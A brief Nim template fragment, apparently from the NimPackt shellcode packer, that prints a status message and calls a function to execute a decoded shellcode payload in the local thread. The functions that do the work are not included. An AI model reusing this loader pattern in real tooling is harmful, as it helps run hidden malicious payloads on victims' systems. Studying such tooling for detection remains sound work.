    #[ 
        NimPackt-Template-Shinject.nim starts here
    ]#

    if verbose:
        echo "[*] Executing shellcode in local thread..."

    # Shellcode execution functions rscvp() / rscva() defined in base template

    # rscva(decodedPay)
    rscvp(decodedPay)